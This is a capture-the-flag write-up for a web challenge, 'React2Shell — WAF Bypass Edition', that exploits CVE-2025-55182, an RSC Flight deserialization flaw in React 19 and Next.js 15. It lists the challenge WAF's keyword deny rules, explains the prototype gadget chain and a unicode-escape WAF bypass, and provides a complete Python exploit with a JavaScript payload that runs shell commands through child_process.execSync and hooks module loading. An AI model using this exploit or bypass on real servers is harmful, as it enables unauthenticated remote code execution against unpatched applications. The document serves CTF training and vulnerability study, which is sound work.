# React2Shell — WAF Bypass Edition

| Field | Value |
|-------|-------|
| Category | Web |
| Points | 500 |

## Description

> TechMart is an elite PC hardware store built on Next.js 15 and React 19.
> They've deployed a state-of-the-art SecureShield WAF to protect their
> checkout server action from injection attacks.
>
> Can you break through the WAF and get RCE on the server?
>
> Target: `http://<host>:3000/`
>
> **CVE:** CVE-2025-55182 (CVSS 10.0)

## Solution

# React2Shell — WAF Bypass Edition
## Full Technical Writeup

**Challenge:** TechMart CTF — React2Shell
**CVE:** CVE-2025-55182 (CVSS 10.0)
**Category:** Web Exploitation
**Difficulty:** Hard
**Flag:** `CHC{r34ct_fl1ght_d3s3r_w4f_byp4ss_1s_4rt}`

---

## 1. Overview

This challenge demonstrates **CVE-2025-55182** — a Remote Code Execution vulnerability
in React 19.0.0 + Next.js 15.0.0 via the **RSC (React Server Components) Flight protocol**
deserialization. An attacker can achieve unauthenticated server-side code execution by
crafting a malicious multipart/form-data payload that exploits the way RSC decodes
server action arguments.

The added twist: a custom **SecureShield WAF** blocks all obvious exploit keywords at
the raw-byte level. Bypassing it requires understanding that JSON unicode escapes
(`\uXXXX`) are invisible to the WAF but decoded by React's parser.

---

## 2. Reconnaissance

### 2.1 Technology Fingerprinting

Loading the homepage reveals the stack in the HTML:

```html
<meta name="x-build-info" content="Next.js 15.0.0 | React 19.0.0 | RSC enabled"/>
```

Response headers show:
```
X-Powered-By: Next.js
X-WAF-Version: 2.1.4
```

This immediately flags **Next.js 15.0.0 + React 19.0.0** as potentially vulnerable to
**CVE-2025-55182**.

### 2.2 Finding the Server Action

Clicking "Add to Cart" on any product and then "Place Order" shows a network request:

```
POST /
next-action: 0967c4afc8b2c18af6ee6906adf4e74045dea257
content-type: multipart/form-data; boundary=...
```

The `next-action` header identifies a **Next.js Server Action** — a server-side function
called directly from the browser via RSC. The 40-character hex value is the action's
SHA-1-like identifier, deterministic from the build.

### 2.3 WAF Discovery

Sending a raw payload with `child_process`:

```bash
curl -X POST http://target:3000/ \
  -H "next-action: 0967c4afc8b2c18af6ee6906adf4e74045dea257" \
  -H "content-type: text/plain;charset=UTF-8" \
  --data-raw '{"x":"child_process"}'
```

Returns:
```
HTTP/1.1 403 Forbidden
X-WAF-Rule: SS-003
```

The WAF has **20 rules** (SS-001 through SS-020) blocking dangerous keywords:

| Rule   | Pattern              | Blocks                          |
|--------|----------------------|---------------------------------|
| SS-001 | `/constructor/i`     | Prototype pollution             |
| SS-002 | `/\beval\b/i`        | Eval-based RCE                  |
| SS-003 | `/child_process/i`   | Node.js subprocess              |
| SS-004 | `/require\s*\(/i`    | Module loading                  |
| SS-005 | `/execSync/i`        | Synchronous execution           |
| SS-006 | `/execFile/i`        | File execution                  |
| SS-007 | `/spawnSync/i`       | Process spawning                |
| SS-008 | `/__proto__/i`       | Prototype chain access          |
| SS-009 | `/prototype\s*\[/i`  | Prototype property access       |
| SS-010 | `/mainModule/i`      | Node.js main module             |
| SS-011 | `/readFileSync/i`    | File reading                    |
| SS-012 | `/writeFileSync/i`   | File writing                    |
| SS-013 | `/process\s*\./i`    | Process object access           |
| SS-014 | `/global\s*\[/i`     | Global object access            |
| SS-015 | `/binding\s*\(/i`    | Native bindings                 |
| SS-016 | `/openSync\s*\(/i`   | File descriptor operations      |
| SS-017 | `/Buffer\s*\./i`     | Buffer operations               |
| SS-018 | `/vm\s*\.\s*run/i`   | VM module execution             |
| SS-019 | `/Function\s*\(/i`   | Function constructor            |
| SS-020 | `/import\s*\(/i`     | Dynamic imports                 |

---

## 3. Vulnerability Analysis — CVE-2025-55182

### 3.1 RSC Flight Protocol

React Server Components use a binary/text serialization format called **RSC Flight** to
transfer component trees between server and client. When a **Server Action** is invoked,
the browser encodes its arguments using this protocol and sends them as a multipart body.

The server decodes the body using `decodeReply()` from `react-server-dom-webpack`.

### 3.2 The Gadget Chain

The RSC decoder processes each multipart field as a **chunk** with a numeric ID. Chunks
can reference each other using `$@N` (deferred reference) and traverse object paths
using `$1:path:path` syntax.

The exploit uses three gadgets:

**Gadget 1 — Thenable creation via `$1:__proto__:then`**

When a chunk's `then` property is set to `$1:__proto__:then`, the decoder accesses
`chunk0.__proto__.then` = `Chunk.prototype.then`. This makes `chunk0` look like a
**thenable** (a Promise-like object). JavaScript's Promise resolution mechanism then
calls `chunk0.then(resolve, reject)` → executes the chunk's `then` handler with
`resolve` as `arguments[0]`.

**Gadget 2 — Function constructor via `$1:constructor:constructor`**

Setting `_formData.get` to `$1:constructor:constructor` resolves to
`Chunk.constructor.constructor` = the native `Function` constructor. This is used in
the RSC `case "B"` handler:

```js
// Inside the RSC decoder's "B" case handler:
e._formData.get(e._prefix + t)  // = Function(JS_CODE + "1337")
```

When `_formData.get` is the `Function` constructor and `_prefix` is our JS code,
this creates and immediately calls our function — giving us **code execution**.

**Gadget 3 — `$@0` deferred reference**

Field "1" = `"$@0"` creates a reference to chunk 0. When the RSC decoder resolves this
reference, it sees chunk 0 is a thenable and invokes the thenable resolution path,
triggering gadgets 1 and 2.

### 3.3 The Execution Flow

```
decodeReply(body) is called
  → processes field "1" = "$@0" (deferred reference to chunk 0)
  → processes field "0" = our fake JSON chunk
  → chunk 0 has "then": "$1:__proto__:then"
  → chunk 0 looks like a thenable
  → Promise resolution calls chunk0.then(resolve, reject)
  → "then" handler reads _formData.get(_prefix + "1337")
  → _formData.get = Function constructor (via $1:constructor:constructor)
  → Function(JS_CODE + "1337") is created and called
  → arguments[0] = resolve function
  → OUR CODE EXECUTES
```

### 3.4 The `apply(null, j)` Constraint

After `decodeReply` resolves, Next.js calls:

```js
let o = (await n.__next_app__.require(y))[ACTION_ID]
let i = await o.apply(null, j)   // j = decoded reply value
```

**Critical**: `Function.prototype.apply` requires its second argument to be array-like.
If our code calls `arguments[0](flagString)`, then `j = "flag_string"` and
`o.apply(null, "flag_string")` throws:

```
TypeError: CreateListFromArrayLike called on non-object
```

**Fix**: Call `arguments[0]([null, {get: () => null}])` to resolve `decodeReply` with
a valid array. This passes `(null, {get:()=>null})` to the action function.

---

## 4. WAF Bypass — JSON Unicode Escapes

### 4.1 The Core Insight

The WAF inspects **raw bytes** of the request body. It does NOT decode JSON unicode
escape sequences before pattern matching.

React's RSC parser, however, **fully decodes** JSON unicode escapes when processing
string values. This creates a gap:

```
WAF sees:   \u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073
WAF match:  NO MATCH (raw bytes ≠ "child_process")
RSC parses: "child_process" ✓
```

### 4.2 Encoding Implementation

```python
def uni_encode(text, words_to_block):
    for word in sorted(words_to_block, key=len, reverse=True):
        encoded = ''.join('\\u{:04X}'.format(ord(c)) for c in word)
        text = text.replace(word, encoded)
    return text

BLOCKED = ['__proto__', 'constructor', 'mainModule', 'child_process',
           'execSync', 'require', 'process', 'eval', 'Function']
```

All blocked keywords in the JS code, the `then` reference path, and the `get`
reference path are encoded using this function.

### 4.3 Critical Pitfall: `json.dumps` Double-Escaping

Using Python's `json.dumps()` to build the payload will **double-escape** unicode
sequences:

```python
# BAD - json.dumps turns \u0063 into \\u0063 in raw bytes:
field0 = json.dumps({"_prefix": enc_code})
# → "_prefix":"\\u0063\\u0068..." (backslash-u, not \u sequence)
# → RSC parser sees literal "\u0063", not decoded char

# GOOD - manual string concatenation preserves \uXXXX as-is:
field0 = '{"_prefix":"' + enc_code + '"}'
# → "_prefix":"\u0063\u0068..." (proper JSON unicode escape)
```

The payload must be **manually constructed** as a string, never through `json.dumps`.

### 4.4 The `value` Field Format

The `value` field must contain a JSON string whose decoded value is `{"then":"$B1337"}`.
This requires double-encoding:

```python
# The raw bytes in the payload must be: {"then":"$B1337"}  (outer JSON string)
# Which means the value field raw bytes are: {\"then\":\"$B1337\"}
# Python string to produce those raw bytes:
value_encoded = '{\\"then\\":\\"$B1337\\"}'
```

### 4.5 Single-Quote Rule

JS string literals in the payload **must use single quotes**, not double quotes.
Any literal `"` in the JS code would break the JSON string embedding in `_prefix`.

```python
# BAD:
"req['child_process']['execSync']('cat /flag.txt')"
# ← Wait, this uses single quotes ✓

# Double quotes would break the JSON:
# "req[\"child_process\"]..."  ← literal " in JS = JSON parse error
```

### 4.6 Arrow Functions vs `function()`

The WAF blocks `/Function\s*\(/i` (SS-019). Using `function(){}` in lowercase would
also match if the WAF had that rule. **Arrow functions** `(x) => {}` avoid this entirely:

```js
// Blocked (if WAF matched function keyword):
na['require'] = function(y) { ... }

// Safe - arrow function:
na['require'] = (y) => { ... }
```

---

## 5. The Module Interceptor — Getting the Flag in the Response

### 5.1 Timing Discovery

By reading the Next.js compiled runtime (`app-page.runtime.prod.js`), we find the
action dispatch flow:

```js
// Inside the server action handler:
if (ro(e)) {  // multipart/form-data path
    let { decodeReply: n, ... } = require("react-server/...");
    // n = decodeReply (inner scope, shadows outer n)

    j = await n(r, a, {temporaryReferences: p})  // OUR RCE RUNS HERE
    //                                            ^^^^^^^^^^^^^^^^^^^
}

// After the if block — outer scope n = cart page module:
try { y = y ?? rf(w, a) } catch(e) { ... }
let o = (await n.__next_app__.require(y))[w]  // CALLED AFTER RCE
//                ^^^^^^^^^^^^^^^^^^^^^^^^
//                THIS FIRES AFTER decodeReply RESOLVES
let i = await o.apply(null, j)
```

**Key insight**: `n.__next_app__.require(y)` executes **after** our RCE code runs.
If we replace `n.__next_app__.require` with an interceptor during RCE, our interceptor
will be called when the action module loads.

### 5.2 Accessing `__next_app__`

The outer scope `n` is the cart page module exports. We access the same object via:

```js
var cartPage = req('/app/.next/server/app/cart/page.js');
// Returns the cached CJS module exports — same instance as runtime's n
// cartPage['__next_app__'] === n.__next_app__ ✓
```

**Important**: `req.cache` (where `req = process.mainModule.require`) is `undefined`
in the Next.js webpack context. The webpack custom require wrapper doesn't expose
`.cache`. Use direct require by path instead.

### 5.3 The Interceptor Pattern

```js
var na = cartPage['__next_app__'];
var origR = na['require'];
na['require'] = (y) => {
    var m = origR(y);
    if (m && m['ACTION_ID']) {
        m['ACTION_ID'] = async () => ({success: true, flag: flag})
    }
    return m
}
```

When Next.js calls `n.__next_app__.require(moduleId)`:
1. Our interceptor runs
2. Gets the original module `m`
3. Replaces the action export with our function
4. Returns the patched module
5. `o = m[ACTION_ID]` = our function
6. `await o.apply(null, j)` = `{success: true, flag: "CHC{...}"}`
7. Flag serialized into RSC stream → appears in HTTP response

---

## 6. Complete Exploit

### 6.1 JavaScript Payload

```javascript
arguments[0]((()=>{
    var req = process['mainModule']['require'];
    var flag = req('child_process')['execSync']('cat /flag.txt').toString().trim();
    var cartPage = req('/app/.next/server/app/cart/page.js');
    if (cartPage && cartPage['__next_app__']) {
        var na = cartPage['__next_app__'];
        var origR = na['require'];
        na['require'] = (y) => {
            var m = origR(y);
            if (m && m['0967c4afc8b2c18af6ee6906adf4e74045dea257']) {
                m['0967c4afc8b2c18af6ee6906adf4e74045dea257'] =
                    async () => ({success: true, flag: flag})
            }
            return m
        }
    }
    return [null, {get: () => null}]
})())//
```

### 6.2 Full Python Exploit Script

```python
#!/usr/bin/env python3
import subprocess, re

ACTION   = "0967c4afc8b2c18af6ee6906adf4e74045dea257"
TARGET   = "http://target:3000/"
BOUNDARY = "----WebKitFormBoundaryCTF1337"

def uni_encode(text, words):
    for word in sorted(words, key=len, reverse=True):
        enc = ''.join('\\u{:04X}'.format(ord(c)) for c in word)
        text = text.replace(word, enc)
    return text

BLOCKED = ['__proto__', 'constructor', 'mainModule', 'child_process',
           'execSync', 'require', 'process', 'eval', 'Function']

js_code = (
    "arguments[0]((()=>{"
    "var req=process['mainModule']['require'];"
    "var flag=req('child_process')['execSync']('cat /flag.txt').toString().trim();"
    "var cartPage=req('/app/.next/server/app/cart/page.js');"
    "if(cartPage&&cartPage['__next_app__']){"
    "var na=cartPage['__next_app__'];"
    "var origR=na['require'];"
    "na['require']=(y)=>{"
    "var m=origR(y);"
    "if(m&&m['0967c4afc8b2c18af6ee6906adf4e74045dea257']){"
    "m['0967c4afc8b2c18af6ee6906adf4e74045dea257']=async()=>({success:true,flag:flag})"
    "}"
    "return m"
    "}}"
    "return[null,{get:()=>null}]"
    "})())//"
)

enc_code = uni_encode(js_code, BLOCKED)
enc_then = uni_encode("$1:__proto__:then", BLOCKED)
enc_get  = uni_encode("$1:constructor:constructor", BLOCKED)
value_encoded = '{\\"then\\":\\"$B1337\\"}'

field0 = (
    '{"then":"' + enc_then + '",'
    '"status":"resolved_model",'
    '"reason":-1,'
    '"value":"' + value_encoded + '",'
    '"_response":{'
    '"_prefix":"' + enc_code + '",'
    '"_formData":{"get":"' + enc_get + '"}'
    '}}'
)
field1 = '"$@0"'

body = (
    f"--{BOUNDARY}\r\n"
    f'Content-Disposition: form-data; name="0"\r\n\r\n'
    f"{field0}\r\n"
    f"--{BOUNDARY}\r\n"
    f'Content-Disposition: form-data; name="1"\r\n\r\n'
    f"{field1}\r\n"
    f"--{BOUNDARY}--\r\n"
)

r = subprocess.run([
    "curl", "-s", "-X", "POST", TARGET,
    "-H", f"next-action: {ACTION}",
    "-H", f"content-type: multipart/form-data; boundary={BOUNDARY}",
    "--data-binary", "-"
], input=body.encode('ascii'), capture_output=True)

output = r.stdout.decode()
print(output)
flags = re.findall(r'CHC\{[^}]+\}', output)
if flags:
    print(f"\n[+] FLAG: {flags[0]}")
```

### 6.3 Expected Response

```
0:{"a":"$@1","f":"","b":"zS1uFVd-hsZBOEBvbLTvQ"}
1:{"success":true,"flag":"CHC{r34ct_fl1ght_d3s3r_w4f_byp4ss_1s_4rt}"}
```

---

## 7. Key Debugging Challenges

### 7.1 `require.cache` is undefined

`process.mainModule.require.cache` returns `undefined` in the Next.js webpack context.
The webpack custom require wrapper doesn't expose the CJS module cache. Attempting
`req['cache']['/app/.next/...']` throws `TypeError: Cannot read properties of undefined`.

**Solution**: Use `req('/app/.next/server/app/cart/page.js')` directly — this returns
the cached module exports (same instance the runtime uses).

### 7.2 `for...in undefined` silently does nothing

Early exploit versions used:
```js
var cache = req['cache'];
for (var k in cache) { ... }
```
Since `cache` is `undefined`, `for (var k in undefined)` silently does nothing in
non-strict mode (ES5+ spec). The loop body never runs, the module is never patched,
and the action returns "Cart is empty" with no visible error.

### 7.3 `writeFileSync` is WAF-blocked (SS-012)

Using `require('fs').writeFileSync(...)` as a side channel triggers SS-012.
The `/app/public/` directory is also owned by root and not writable by the ctfuser
process (uid=1001). Use `openSync` + `writeSync` instead if needed, or avoid
file writes altogether.

### 7.4 `execSync` throws on non-zero exit

If an `execSync` command fails (e.g., `cp /flag.txt /app/public/f.txt` returns
permission denied), it throws an exception. Since the throw happens before
`arguments[0]` is called, `decodeReply` rejects (not resolves), causing the server
to return an error digest instead of processing the action.

Always wrap potentially-failing commands in try-catch, or use only commands known
to succeed.

---

## 8. Lessons Learned

1. **CVE-2025-55182**: Affects Next.js 15.0.0–15.0.4 + React 19.0.0. Any app with
   Server Actions is potentially exploitable — unauthenticated, single request.

2. **WAF bypass via encoding**: When a WAF checks raw bytes but the parser decodes
   representations (unicode escapes, percent encoding, etc.), there's always a bypass.
   The solution is server-side input validation AFTER decoding, not before.

3. **Timing matters in async code**: Understanding *when* each piece of code runs
   (decodeReply vs. action load vs. action call) is essential for placing hooks
   at the right moment.

4. **Prototype gadgets**: `__proto__` traversal in RSC decoders can expose the
   Function constructor. Any JavaScript deserializer that allows property path
   traversal should restrict access to `constructor` and `__proto__`.

5. **json.dumps pitfall**: Encoding a string that contains `\uXXXX` with
   `json.dumps` produces `\\uXXXX` — the parser no longer sees it as a unicode
   escape. Manual JSON construction is sometimes necessary.

---

## 9. Patch

**Affected versions**: React 19.0.0, Next.js 15.0.0–15.0.4
**Fixed versions**: React 19.0.1+, Next.js 15.0.5+

The patch validates that RSC chunk references cannot traverse `__proto__` or
`constructor` chains, and validates that `_formData.get` is actually a FormData
instance before calling it.

```bash
npm install next@latest react@latest react-dom@latest
```


## Flag

`CHC{r34ct_fl1ght_d3s3r_w4f_byp4ss_1s_4rt}`
